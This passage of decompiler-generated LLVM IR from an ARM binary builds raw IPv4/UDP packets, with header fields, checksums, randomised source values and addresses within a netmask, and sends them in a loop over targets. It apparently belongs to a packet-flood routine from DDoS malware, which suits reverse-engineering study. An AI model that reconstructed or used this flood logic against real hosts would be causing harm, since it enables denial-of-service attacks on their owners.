  store i32 %v5_a100, i32* %r3.global-to-local, align 4
  store i32 %v5_9ee8, i32* %r2.global-to-local, align 4
  %v1_a108 = load i32, i32* %r4.global-to-local, align 4
  %v2_a108 = add i32 %v1_a108, 12
  %v3_a108 = inttoptr i32 %v2_a108 to i32*
  store i32 %v5_9ee8, i32* %v3_a108, align 4
  %v0_a10c = load i32, i32* %r3.global-to-local, align 4
  %v1_a10c = load i32, i32* @sb, align 4
  %v2_a10c = add i32 %v1_a10c, %v0_a10c
  store i32 %v2_a10c, i32* %r3.global-to-local, align 4
  %v0_a110 = load i32, i32* %r1.global-to-local, align 4
  %v1_a110 = trunc i32 %v0_a110 to i8
  %v2_a110 = load i32, i32* %r4.global-to-local, align 4
  %v3_a110 = add i32 %v2_a110, 4
  %v4_a110 = inttoptr i32 %v3_a110 to i8*
  store i8 %v1_a110, i8* %v4_a110, align 1
  %v0_a114 = load i32, i32* %r3.global-to-local, align 4
  %v1_a114 = add i32 %v0_a114, 16
  %v2_a114 = inttoptr i32 %v1_a114 to i32*
  %v3_a114 = load i32, i32* %v2_a114, align 4
  store i32 %v3_a114, i32* %r2.global-to-local, align 4
  %v0_a118 = load i32, i32* %r4.global-to-local, align 4
  %v1_a118 = add i32 %v0_a118, 20
  store i32 %v1_a118, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v0_a120 = load i32, i32* %r0.global-to-local, align 4
  %v1_a120 = trunc i32 %v0_a120 to i8
  %v3_a120 = add i32 %v0_a118, 23
  %v4_a120 = inttoptr i32 %v3_a120 to i8*
  store i8 %v1_a120, i8* %v4_a120, align 1
  %v0_a124 = load i32, i32* %r3.global-to-local, align 4
  %v1_a124 = trunc i32 %v0_a124 to i8
  %v2_a124 = load i32, i32* %r1.global-to-local, align 4
  %v3_a124 = add i32 %v2_a124, 2
  %v4_a124 = inttoptr i32 %v3_a124 to i8*
  store i8 %v1_a124, i8* %v4_a124, align 1
  %v0_a128 = load i32, i32* %r4.global-to-local, align 4
  %v1_a128 = add i32 %v0_a128, 24
  %v2_a128 = inttoptr i32 %v1_a128 to i8*
  %v3_a128 = load i8, i8* %v2_a128, align 1
  %tmp104 = urem i8 %v3_a128, 16
  %v1_a12c = zext i8 %tmp104 to i32
  %v1_a130 = or i32 %v1_a12c, 64
  store i32 %v1_a130, i32* %r3.global-to-local, align 4
  %v1_a134 = trunc i32 %v1_a130 to i8
  store i8 %v1_a134, i8* %v2_a128, align 1
  %v0_a138 = load i32, i32* %r2.global-to-local, align 4
  %v1_a138 = load i32, i32* %r4.global-to-local, align 4
  %v2_a138 = add i32 %v1_a138, 16
  %v3_a138 = inttoptr i32 %v2_a138 to i32*
  store i32 %v0_a138, i32* %v3_a138, align 4
  %v0_a13c = load i32, i32* %r4.global-to-local, align 4
  %v1_a13c = add i32 %v0_a13c, 24
  %v2_a13c = inttoptr i32 %v1_a13c to i8*
  %v3_a13c = load i8, i8* %v2_a13c, align 1
  %v1_a140 = and i8 %v3_a13c, -16
  %v1_a144 = or i8 %v1_a140, 5
  store i8 %v1_a144, i8* %v2_a13c, align 1
  %v0_a150 = load i32, i32* %r4.global-to-local, align 4
  %v1_a150 = add i32 %v0_a150, 24
  store i32 %v1_a150, i32* @r5, align 4
  %v3_a154 = add i32 %v0_a150, 25
  %v4_a154 = inttoptr i32 %v3_a154 to i8*
  store i8 %v5_9e00, i8* %v4_a154, align 1
  store i32 %v3_a024, i32* %r1.global-to-local, align 4
  store i32 %tmp86, i32* %r3.global-to-local, align 4
  store i32 %v3_a034, i32* %r2.global-to-local, align 4
  %v2_a164 = load i32, i32* @r5, align 4
  %v3_a164 = add i32 %v2_a164, 4
  %v4_a164 = inttoptr i32 %v3_a164 to i8*
  store i8 %v5_9fdc, i8* %v4_a164, align 1
  %v0_a168 = load i32, i32* %r1.global-to-local, align 4
  %v1_a168 = trunc i32 %v0_a168 to i8
  %v2_a168 = load i32, i32* @r5, align 4
  %v3_a168 = add i32 %v2_a168, 2
  %v4_a168 = inttoptr i32 %v3_a168 to i8*
  store i8 %v1_a168, i8* %v4_a168, align 1
  %v0_a16c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a16c, label %bb91, label %bb90

bb90:                                             ; preds = %.thread23
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb91

bb91:                                             ; preds = %.thread23, %bb90
  store i32 %v3_a038, i32* %r1.global-to-local, align 4
  %v0_a174 = load i32, i32* %r2.global-to-local, align 4
  %v1_a174 = trunc i32 %v0_a174 to i8
  %v2_a174 = load i32, i32* @r5, align 4
  %v3_a174 = add i32 %v2_a174, 3
  %v4_a174 = inttoptr i32 %v3_a174 to i8*
  store i8 %v1_a174, i8* %v4_a174, align 1
  store i32 %v4_a0b4, i32* %r2.global-to-local, align 4
  %v0_a17c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a17c, label %bb93, label %bb92

bb92:                                             ; preds = %bb91
  %v1_a17c = load i32, i32* %r3.global-to-local, align 4
  %v2_a17c = trunc i32 %v1_a17c to i8
  %v3_a17c = load i32, i32* @r5, align 4
  %v4_a17c = add i32 %v3_a17c, 6
  %v5_a17c = inttoptr i32 %v4_a17c to i8*
  store i8 %v2_a17c, i8* %v5_a17c, align 1
  br label %bb93

bb93:                                             ; preds = %bb91, %bb92
  store i32 17, i32* %r3.global-to-local, align 4
  %v0_a184 = load i32, i32* %r1.global-to-local, align 4
  %v1_a184 = trunc i32 %v0_a184 to i8
  %v2_a184 = load i32, i32* @r5, align 4
  %v3_a184 = add i32 %v2_a184, 5
  %v4_a184 = inttoptr i32 %v3_a184 to i8*
  store i8 %v1_a184, i8* %v4_a184, align 1
  %v0_a188 = load i32, i32* %r2.global-to-local, align 4
  %v1_a188 = trunc i32 %v0_a188 to i8
  %v2_a188 = load i32, i32* @r5, align 4
  %v3_a188 = add i32 %v2_a188, 8
  %v4_a188 = inttoptr i32 %v3_a188 to i8*
  store i8 %v1_a188, i8* %v4_a188, align 1
  %v0_a18c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a18c, label %bb95, label %bb94

bb94:                                             ; preds = %bb93
  %v1_a18c = load i32, i32* %r0.global-to-local, align 4
  %v2_a18c = trunc i32 %v1_a18c to i8
  %v3_a18c = load i32, i32* @r5, align 4
  %v4_a18c = add i32 %v3_a18c, 7
  %v5_a18c = inttoptr i32 %v4_a18c to i8*
  store i8 %v2_a18c, i8* %v5_a18c, align 1
  br label %bb95

bb95:                                             ; preds = %bb93, %bb94
  %v0_a190 = load i32, i32* %r3.global-to-local, align 4
  %v1_a190 = trunc i32 %v0_a190 to i8
  %v2_a190 = load i32, i32* @r5, align 4
  %v3_a190 = add i32 %v2_a190, 9
  %v4_a190 = inttoptr i32 %v3_a190 to i8*
  store i8 %v1_a190, i8* %v4_a190, align 1
  %v0_a194 = call i32 @function_e978()
  store i32 %v0_a194, i32* %r0.global-to-local, align 4
  store i32 %v1_9f48, i32* %r1.global-to-local, align 4
  store i1 %v2_a1a0, i1* %cpsr_z.global-to-local, align 1
  %v1_a1a4 = sub i32 1023, %v0_a194
  store i32 %v1_a1a4, i32* %r3.global-to-local, align 4
  br i1 %v2_a1a0, label %.thread24, label %.thread25

.thread24:                                        ; preds = %bb95
  %v2_a1ac = load i32, i32* @r5, align 4
  %v3_a1ac = add i32 %v2_a1ac, 16
  %v4_a1ac = inttoptr i32 %v3_a1ac to i32*
  store i32 %v1_a1a4, i32* %v4_a1ac, align 4
  br label %bb96

.thread25:                                        ; preds = %bb95
  %v1_a1a8 = load i32, i32* %r4.global-to-local, align 4
  %v2_a1a8 = add i32 %v1_a1a8, 16
  %v3_a1a8 = inttoptr i32 %v2_a1a8 to i32*
  %v4_a1a8 = load i32, i32* %v3_a1a8, align 4
  store i32 %v4_a1a8, i32* %r3.global-to-local, align 4
  %v2_a1b0 = load i32, i32* @r5, align 4
  %v3_a1b0 = add i32 %v2_a1b0, 16
  %v4_a1b0 = inttoptr i32 %v3_a1b0 to i32*
  store i32 %v4_a1a8, i32* %v4_a1b0, align 4
  br label %bb96

bb96:                                             ; preds = %.thread24, %.thread25
  store i32 %v4_a030, i32* %r3.global-to-local, align 4
  %v0_a1b8 = load i32, i32* %r4.global-to-local, align 4
  %v1_a1b8 = add i32 %v0_a1b8, 44
  store i32 %v1_a1b8, i32* @r6, align 4
  %v1_a1bc = load i32, i32* @r5, align 4
  %v2_a1bc = add i32 %v1_a1bc, 12
  %v3_a1bc = inttoptr i32 %v2_a1bc to i32*
  store i32 %v0_a194, i32* %v3_a1bc, align 4
  store i32 %v4_a1c0, i32* %r2.global-to-local, align 4
  %v0_a1c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1c4 = trunc i32 %v0_a1c4 to i8
  %v2_a1c4 = load i32, i32* @r6, align 4
  %v3_a1c4 = inttoptr i32 %v2_a1c4 to i8*
  store i8 %v1_a1c4, i8* %v3_a1c4, align 1
  %v3_a1c8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a1c8, i32* %r3.global-to-local, align 4
  %v0_a1cc = load i32, i32* %r2.global-to-local, align 4
  %v1_a1cc = trunc i32 %v0_a1cc to i8
  %v2_a1cc = load i32, i32* @r6, align 4
  %v3_a1cc = add i32 %v2_a1cc, 5
  %v4_a1cc = inttoptr i32 %v3_a1cc to i8*
  store i8 %v1_a1cc, i8* %v4_a1cc, align 1
  %v0_a1d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1d0 = add i32 %v0_a1d0, 1
  store i32 %v1_a1d0, i32* @r4, align 4
  store i32 %v3_a048, i32* %r1.global-to-local, align 4
  store i32 %v7_a1d8, i32* %r2.global-to-local, align 4
  %v1_a1dc = load i32, i32* @fp, align 4
  %v9_a1dc = icmp eq i32 %v1_a1d0, %v1_a1dc
  store i1 %v9_a1dc, i1* %cpsr_z.global-to-local, align 1
  %v2_a1e0 = load i32, i32* @r6, align 4
  %v3_a1e0 = add i32 %v2_a1e0, 1
  %v4_a1e0 = inttoptr i32 %v3_a1e0 to i8*
  store i8 %v5_a058, i8* %v4_a1e0, align 1
  %v0_a1e4 = load i32, i32* @r7, align 4
  %v1_a1e4 = trunc i32 %v0_a1e4 to i8
  %v2_a1e4 = load i32, i32* @r6, align 4
  %v3_a1e4 = add i32 %v2_a1e4, 2
  %v4_a1e4 = inttoptr i32 %v3_a1e4 to i8*
  store i8 %v1_a1e4, i8* %v4_a1e4, align 1
  %v0_a1e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_a1e8 = trunc i32 %v0_a1e8 to i8
  %v2_a1e8 = load i32, i32* @r6, align 4
  %v3_a1e8 = add i32 %v2_a1e8, 3
  %v4_a1e8 = inttoptr i32 %v3_a1e8 to i8*
  store i8 %v1_a1e8, i8* %v4_a1e8, align 1
  %v0_a1ec = load i32, i32* %r8.global-to-local, align 4
  %v1_a1ec = trunc i32 %v0_a1ec to i8
  %v2_a1ec = load i32, i32* @r6, align 4
  %v3_a1ec = add i32 %v2_a1ec, 4
  %v4_a1ec = inttoptr i32 %v3_a1ec to i8*
  store i8 %v1_a1ec, i8* %v4_a1ec, align 1
  %v0_a1f0 = load i32, i32* @r4, align 4
  store i32 %v0_a1f0, i32* %stack_var_-40, align 4
  %v5_a1f4 = icmp slt i32 %v1_a1d0, %v1_a1dc
  br i1 %v5_a1f4, label %dec_label_pc_a068, label %dec_label_pc_a1f8

dec_label_pc_a1f8:                                ; preds = %bb96
  %v1_a200 = add i32 %v5_9e94, 8
  store i32 %v1_a200, i32* %r3.global-to-local, align 4
  %v1_a204 = add i32 %v5_9e94, 52
  store i32 %v1_a204, i32* %r1.global-to-local, align 4
  %v0_a210.pre.pre = load i32, i32* @fp, align 4
  br label %dec_label_pc_a210.preheader

dec_label_pc_a210.preheader:                      ; preds = %dec_label_pc_a1f8, %dec_label_pc_a4a4
  %v0_a210.pre = phi i32 [ %v0_a210.pre.pre, %dec_label_pc_a1f8 ], [ %v0_9f58, %dec_label_pc_a4a4 ]
  %stack_var_-120.0.ph = phi i32 [ %v1_a204, %dec_label_pc_a1f8 ], [ %v1_a4b0, %dec_label_pc_a4a4 ]
  %stack_var_-152.0.ph = phi i32 [ %v1_a200, %dec_label_pc_a1f8 ], [ %v1_a4ac, %dec_label_pc_a4a4 ]
  %v2_a488 = icmp eq i32 %v1_9eb4, 0
  %v2_a288 = icmp eq i32 %v1_9f48, 0
  %v2_a254 = icmp eq i32 %v5_9ee8, -1
  %v7_a254 = icmp eq i32 %v5_9ee8, -1
  br label %dec_label_pc_a210

dec_label_pc_a210:                                ; preds = %dec_label_pc_a2a4, %dec_label_pc_a210.preheader
  %v0_a210 = phi i32 [ %v0_a210.pre, %dec_label_pc_a210.preheader ], [ %v1_a368, %dec_label_pc_a2a4 ]
  %v2_a210 = icmp eq i32 %v0_a210, 0
  store i1 %v2_a210, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp97 = icmp slt i32 %v0_a210, 1
  br label %dec_label_pc_a218

dec_label_pc_a218:                                ; preds = %dec_label_pc_a218, %dec_label_pc_a210
  br i1 %tmp97, label %dec_label_pc_a218, label %dec_label_pc_a21c

dec_label_pc_a21c:                                ; preds = %dec_label_pc_a218
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_a228

dec_label_pc_a228:                                ; preds = %dec_label_pc_a2a4, %dec_label_pc_a21c
  %v1_a23c = phi i32 [ %v1_a364, %dec_label_pc_a2a4 ], [ 0, %dec_label_pc_a21c ]
  %v5_a22c = mul i32 %v1_a23c, 24
  %v1_a230 = load i32, i32* @sb, align 4
  %v2_a230 = add i32 %v1_a230, %v5_a22c
  store i32 %v2_a230, i32* %r3.global-to-local, align 4
  store i32 %v2_9dc8, i32* %r1.global-to-local, align 4
  %v1_a238 = add i32 %v2_a230, 20
  %v2_a238 = inttoptr i32 %v1_a238 to i8*
  %v3_a238 = load i8, i8* %v2_a238, align 1
  %v4_a238 = zext i8 %v3_a238 to i32
  store i32 %v4_a238, i32* %r2.global-to-local, align 4
  %v4_a23c = mul i32 %v1_a23c, 4
  %v5_a23c = add i32 %v4_a23c, %v2_9dc8
  %v6_a23c = inttoptr i32 %v5_a23c to i32*
  %v7_a23c = load i32, i32* %v6_a23c, align 4
  store i32 %v7_a23c, i32* @r5, align 4
  %v7_a240 = icmp eq i8 %v3_a238, 31
  store i1 %v7_a240, i1* %cpsr_z.global-to-local, align 1
  %v1_a244 = add i32 %v7_a23c, 24
  store i32 %v1_a244, i32* @r6, align 4
  %v1_a248 = add i32 %v7_a23c, 44
  store i32 %v1_a248, i32* @r7, align 4
  %tmp105 = icmp ult i8 %v3_a238, 32
  br i1 %tmp105, label %dec_label_pc_a388, label %dec_label_pc_a250

dec_label_pc_a250:                                ; preds = %dec_label_pc_a228
  store i32 %v5_9ee8, i32* %r2.global-to-local, align 4
  store i1 %v7_a254, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a254, label %dec_label_pc_a3f0, label %dec_label_pc_a25c

dec_label_pc_a25c:                                ; preds = %dec_label_pc_a388, %dec_label_pc_a250
  store i32 65535, i32* @r4, align 4
  %v0_a264 = load i32, i32* @sl, align 4
  %v9_a264 = icmp eq i32 %v0_a264, 65535
  store i1 %v9_a264, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a264, label %dec_label_pc_a408, label %dec_label_pc_a26c

dec_label_pc_a26c:                                ; preds = %dec_label_pc_a3f0.dec_label_pc_a26c_crit_edge, %dec_label_pc_a25c
  %v1_a270 = phi i32 [ %v1_a270.pre, %dec_label_pc_a3f0.dec_label_pc_a26c_crit_edge ], [ 65535, %dec_label_pc_a25c ]
  store i32 %v3_9f50, i32* %r3.global-to-local, align 4
  %v9_a270 = icmp eq i32 %v3_9f50, %v1_a270
  store i1 %v9_a270, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a270, label %dec_label_pc_a440, label %dec_label_pc_a278

dec_label_pc_a278:                                ; preds = %dec_label_pc_a408.dec_label_pc_a278_crit_edge, %dec_label_pc_a26c
  %v1_a27c = phi i32 [ %v1_a27c.pre, %dec_label_pc_a408.dec_label_pc_a278_crit_edge ], [ %v1_a270, %dec_label_pc_a26c ]
  store i32 %v3_9f54, i32* %r1.global-to-local, align 4
  %v9_a27c = icmp eq i32 %v3_9f54, %v1_a27c
  store i1 %v9_a27c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a27c, label %dec_label_pc_a45c, label %dec_label_pc_a284

dec_label_pc_a284:                                ; preds = %dec_label_pc_a440, %dec_label_pc_a278
  store i32 %v1_9f48, i32* %r2.global-to-local, align 4
  store i1 %v2_a288, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a288, label %dec_label_pc_a480, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_a284
  %v1_a28c = load i32, i32* @r5, align 4
  %v2_a28c = add i32 %v1_a28c, 16
  %v3_a28c = inttoptr i32 %v2_a28c to i32*
  %v4_a28c = load i32, i32* %v3_a28c, align 4
  store i32 %v4_a28c, i32* %r3.global-to-local, align 4
  %v2_a290 = load i32, i32* @r6, align 4
  %v3_a290 = add i32 %v2_a290, 16
  %v4_a290 = inttoptr i32 %v3_a290 to i32*
  store i32 %v4_a28c, i32* %v4_a290, align 4
  br label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %bb102, %.thread26
  store i32 %v1_9eb4, i32* %r3.global-to-local, align 4
  store i1 %v2_a488, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a488, label %dec_label_pc_a2a4, label %dec_label_pc_a494

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a298, %dec_label_pc_a480, %dec_label_pc_a494
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a2a8 = load i32, i32* @r8, align 4
  %v1_a2a8 = trunc i32 %v0_a2a8 to i8
  %v2_a2a8 = load i32, i32* @r5, align 4
  %v3_a2a8 = add i32 %v2_a2a8, 10
  %v4_a2a8 = inttoptr i32 %v3_a2a8 to i8*
  store i8 %v1_a2a8, i8* %v4_a2a8, align 1
  %v0_a2ac = load i32, i32* @r8, align 4
  %v1_a2ac = trunc i32 %v0_a2ac to i8
  %v2_a2ac = load i32, i32* @r5, align 4
  %v3_a2ac = add i32 %v2_a2ac, 11
  %v4_a2ac = inttoptr i32 %v3_a2ac to i8*
  store i8 %v1_a2ac, i8* %v4_a2ac, align 1
  %v0_a2b0 = load i32, i32* @r5, align 4
  store i32 %v0_a2b0, i32* @r0, align 4
  %v2_a2b4 = call i32 @function_d0b8(i32 %v0_a2b0, i32 20)
  %v3_a2b4 = trunc i32 %v2_a2b4 to i8
  %v4_a2b8 = sdiv i32 %v2_a2b4, 256
  store i32 %v4_a2b8, i32* %r3.global-to-local, align 4
  %v1_a2bc = trunc i32 %v4_a2b8 to i8
  %v2_a2bc = load i32, i32* @r5, align 4
  %v3_a2bc = add i32 %v2_a2bc, 11
  %v4_a2bc = inttoptr i32 %v3_a2bc to i8*
  store i8 %v1_a2bc, i8* %v4_a2bc, align 1
  %v3_a2c0 = load i32, i32* @r5, align 4
  %v4_a2c0 = add i32 %v3_a2c0, 10
  %v5_a2c0 = inttoptr i32 %v4_a2c0 to i8*
  store i8 %v3_a2b4, i8* %v5_a2c0, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_a2c8 = load i32, i32* @r8, align 4
  %v1_a2c8 = trunc i32 %v0_a2c8 to i8
  %v2_a2c8 = load i32, i32* @r6, align 4
  %v3_a2c8 = add i32 %v2_a2c8, 10
  %v4_a2c8 = inttoptr i32 %v3_a2c8 to i8*
  store i8 %v1_a2c8, i8* %v4_a2c8, align 1
  %v0_a2cc = load i32, i32* @r8, align 4
  %v1_a2cc = trunc i32 %v0_a2cc to i8
  %v2_a2cc = load i32, i32* @r6, align 4
  %v3_a2cc = add i32 %v2_a2cc, 11
  %v4_a2cc = inttoptr i32 %v3_a2cc to i8*
  store i8 %v1_a2cc, i8* %v4_a2cc, align 1
  %v0_a2d0 = load i32, i32* @r6, align 4
  store i32 %v0_a2d0, i32* @r0, align 4
  %v2_a2d4 = call i32 @function_d0b8(i32 %v0_a2d0, i32 20)
  %v3_a2d4 = trunc i32 %v2_a2d4 to i8
  store i32 %v2_a2d4, i32* %r0.global-to-local, align 4
  %v4_a2d8 = sdiv i32 %v2_a2d4, 256
  store i32 %v4_a2d8, i32* %r3.global-to-local, align 4
  %v3_a2dc = load i32, i32* @r6, align 4
  %v4_a2dc = add i32 %v3_a2dc, 10
  %v5_a2dc = inttoptr i32 %v4_a2dc to i8*
  store i8 %v3_a2d4, i8* %v5_a2dc, align 1
  %v0_a2e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_a2e0 = trunc i32 %v0_a2e0 to i8
  %v2_a2e0 = load i32, i32* @r6, align 4
  %v3_a2e0 = add i32 %v2_a2e0, 11
  %v4_a2e0 = inttoptr i32 %v3_a2e0 to i8*
  store i8 %v1_a2e0, i8* %v4_a2e0, align 1
  %v0_a2e4 = load i32, i32* @r7, align 4
  %v1_a2e4 = add i32 %v0_a2e4, 4
  %v2_a2e4 = inttoptr i32 %v1_a2e4 to i8*
  %v3_a2e4 = load i8, i8* %v2_a2e4, align 1
  %v4_a2e4 = zext i8 %v3_a2e4 to i32
  store i32 %v4_a2e4, i32* %r3.global-to-local, align 4
  %v1_a2e8 = add i32 %v0_a2e4, 5
  %v2_a2e8 = inttoptr i32 %v1_a2e8 to i8*
  %v3_a2e8 = load i8, i8* %v2_a2e8, align 1
  %v4_a2e8 = zext i8 %v3_a2e8 to i32
  store i32 %v0_a2e4, i32* @r1, align 4
  %v4_a2f0 = mul nuw nsw i32 %v4_a2e8, 256
  %v5_a2f0 = or i32 %v4_a2f0, %v4_a2e4
  store i32 %v5_a2f0, i32* %r2.global-to-local, align 4
  %v0_a2f4 = load i32, i32* @r8, align 4
  %v1_a2f4 = trunc i32 %v0_a2f4 to i8
  %v3_a2f4 = add i32 %v0_a2e4, 6
  %v4_a2f4 = inttoptr i32 %v3_a2f4 to i8*
  store i8 %v1_a2f4, i8* %v4_a2f4, align 1
  store i32 %stack_var_-152.0.ph, i32* %r3.global-to-local, align 4
  %v0_a2fc = load i32, i32* @r8, align 4
  %v1_a2fc = trunc i32 %v0_a2fc to i8
  %v2_a2fc = load i32, i32* @r7, align 4
  %v3_a2fc = add i32 %v2_a2fc, 7
  %v4_a2fc = inttoptr i32 %v3_a2fc to i8*
  store i8 %v1_a2fc, i8* %v4_a2fc, align 1
  %v0_a300 = load i32, i32* @r6, align 4
  store i32 %v0_a300, i32* %r0.global-to-local, align 4
  %v4_a304 = call i32 @function_d114(i32 %v0_a300, i32 %v0_a2e4, i32 %v5_a2f0, i32 %stack_var_-152.0.ph)
  %v5_a304 = trunc i32 %v4_a304 to i8
  store i32 %v4_a304, i32* %r0.global-to-local, align 4
  %v3_a308 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a308, i32* %r3.global-to-local, align 4
  %v3_a30c = mul i32 %v3_a308, 32
  store i32 %v3_a30c, i32* %r2.global-to-local, align 4
  %v0_a310 = load i32, i32* @r5, align 4
  %v1_a310 = add i32 %v0_a310, 16
  %v2_a310 = inttoptr i32 %v1_a310 to i32*
  %v3_a310 = load i32, i32* %v2_a310, align 4
  store i32 %v3_a310, i32* %r1.global-to-local, align 4
  %v5_a314 = mul i32 %v3_a308, 24
  store i32 %v5_a314, i32* %r2.global-to-local, align 4
  %v4_a31842 = udiv i32 %v4_a304, 256
  %v1_a31c = trunc i32 %v4_a31842 to i8
  %v2_a31c = load i32, i32* @r7, align 4
  %v3_a31c = add i32 %v2_a31c, 7
  %v4_a31c = inttoptr i32 %v3_a31c to i8*
  store i8 %v1_a31c, i8* %v4_a31c, align 1
  %v0_a320 = load i32, i32* %r2.global-to-local, align 4
  %v1_a320 = load i32, i32* @sb, align 4
  %v2_a320 = add i32 %v1_a320, %v0_a320
  store i32 %v2_a320, i32* %lr.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_a328 = load i32, i32* @r7, align 4
  %v4_a328 = add i32 %v3_a328, 6
  %v5_a328 = inttoptr i32 %v4_a328 to i8*
  store i8 %v5_a304, i8* %v5_a328, align 1
  %v0_a32c = load i32, i32* %r1.global-to-local, align 4
  %v1_a32c = load i32, i32* %lr.global-to-local, align 4
  %v2_a32c = add i32 %v1_a32c, 4
  %v3_a32c = inttoptr i32 %v2_a32c to i32*
  store i32 %v0_a32c, i32* %v3_a32c, align 4
  %v0_a330 = load i32, i32* %r3.global-to-local, align 4
  %v1_a330 = trunc i32 %v0_a330 to i8
  %v2_a330 = load i32, i32* %r2.global-to-local, align 4
  %v3_a330 = load i32, i32* @sb, align 4
  %v4_a330 = add i32 %v3_a330, %v2_a330
  %v5_a330 = inttoptr i32 %v4_a330 to i8*
  store i8 %v1_a330, i8* %v5_a330, align 1
  %v0_a334 = load i32, i32* @r8, align 4
  %v1_a334 = trunc i32 %v0_a334 to i8
  %v2_a334 = load i32, i32* %lr.global-to-local, align 4
  %v3_a334 = add i32 %v2_a334, 2
  %v4_a334 = inttoptr i32 %v3_a334 to i8*
  store i8 %v1_a334, i8* %v4_a334, align 1
  %v0_a338 = load i32, i32* @r8, align 4
  %v1_a338 = trunc i32 %v0_a338 to i8
  %v2_a338 = load i32, i32* %lr.global-to-local, align 4
  %v3_a338 = add i32 %v2_a338, 1
  %v4_a338 = inttoptr i32 %v3_a338 to i8*
  store i8 %v1_a338, i8* %v4_a338, align 1
  %v0_a33c = load i32, i32* @r8, align 4
  %v1_a33c = trunc i32 %v0_a33c to i8
  %v2_a33c = load i32, i32* %lr.global-to-local, align 4
  %v3_a33c = add i32 %v2_a33c, 3
  %v4_a33c = inttoptr i32 %v3_a33c to i8*
  store i8 %v1_a33c, i8* %v4_a33c, align 1
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_a348 = load i32, i32* @r5, align 4
  store i32 %v0_a348, i32* %r1.global-to-local, align 4
  store i32 %v3_9efc, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-120.0.ph, i32* %r2.global-to-local, align 4
  %v0_a354 = load i32, i32* %lr.global-to-local, align 4
  %v6_a35c = inttoptr i32 %v0_a348 to i32*
  %v7_a35c = call i32 @function_1237c(i32 %v3_9efc, i32* %v6_a35c, i32 %stack_var_-120.0.ph, i32 16384, i32 %v0_a354, i32 16)
  %v3_a360 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_a360, i32* %r3.global-to-local, align 4
  %v1_a364 = add i32 %v3_a360, 1
  store i32 %v1_a364, i32* %r0.global-to-local, align 4
  %v1_a368 = load i32, i32* @fp, align 4
  %v9_a368 = icmp eq i32 %v1_a364, %v1_a368
  store i1 %v9_a368, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a364, i32* %stack_var_-40, align 4
  %v6_a370 = icmp slt i32 %v1_a364, %v1_a368
  br i1 %v6_a370, label %dec_label_pc_a228, label %dec_label_pc_a210

dec_label_pc_a378:                                ; preds = %dec_label_pc_9f0c
  store i32 %v3_9efc, i32* %r0.global-to-local, align 4
  %v1_a37c = call i32 @function_11af0(i32 %v3_9efc)
  store i32 %v1_a37c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a380

dec_label_pc_a380:                                ; preds = %dec_label_pc_9da8, %dec_label_pc_a378
  %v29_a384 = phi i32 [ %v3_9efc, %dec_label_pc_9da8 ], [ %v1_a37c, %dec_label_pc_a378 ]
  store i32 %v3_9da8, i32* %r4.global-to-local, align 4
  store i32 %v15_9da8, i32* %r8.global-to-local, align 4
  ret i32 %v29_a384

dec_label_pc_a388:                                ; preds = %dec_label_pc_a228
  %v1_a388 = add i32 %v2_a230, 16
  %v2_a388 = inttoptr i32 %v1_a388 to i32*
  %v3_a388 = load i32, i32* %v2_a388, align 4
  store i32 %v3_a388, i32* %r4.global-to-local, align 4
  %v0_a38c = call i32 @function_e978()
  store i32 %v0_a38c, i32* %r0.global-to-local, align 4
  %v3_a390 = load i32, i32* %stack_var_-40, align 4
  %v5_a398 = mul i32 %v3_a390, 24
  %v0_a39c = load i32, i32* %r4.global-to-local, align 4
  %v1_a3a0 = load i32, i32* @sb, align 4
  %v2_a3a0 = add i32 %v1_a3a0, %v5_a398
  store i32 %v2_a3a0, i32* %r1.global-to-local, align 4
  %v1_a3a4 = and i32 %v0_a39c, 65280
  store i32 %v1_a3a4, i32* %r3.global-to-local, align 4
  %v1_a39c = udiv i32 %v0_a39c, 256
  %v3_a3a8 = and i32 %v1_a39c, 65280
  store i32 %v3_a3a8, i32* %r2.global-to-local, align 4
  %v1_a3b0 = add i32 %v2_a3a0, 20
  %v2_a3b0 = inttoptr i32 %v1_a3b0 to i8*
  %v3_a3b0 = load i8, i8* %v2_a3b0, align 1
  %v4_a3b0 = zext i8 %v3_a3b0 to i32
  store i32 %v4_a3b0, i32* %lr.global-to-local, align 4
  %v2_a3bc = call i32 @llvm.bswap.i32(i32 %v0_a39c)
  %v7_a3c0 = lshr i32 %v0_a38c, %v4_a3b0
  %v8_a3c0 = add i32 %v7_a3c0, %v2_a3bc
  %v3_a3cc = mul i32 %v8_a3c0, 16777216
  %v1_a3d0 = and i32 %v8_a3c0, 65280
  store i32 %v1_a3d0, i32* %r0.global-to-local, align 4
  store i32 %v5_9ee8, i32* %r2.global-to-local, align 4
  %v4_a3dc = mul nuw nsw i32 %v1_a3d0, 256
  %v5_a3dc = or i32 %v4_a3dc, %v3_a3cc
  store i32 %v5_a3dc, i32* %r1.global-to-local, align 4
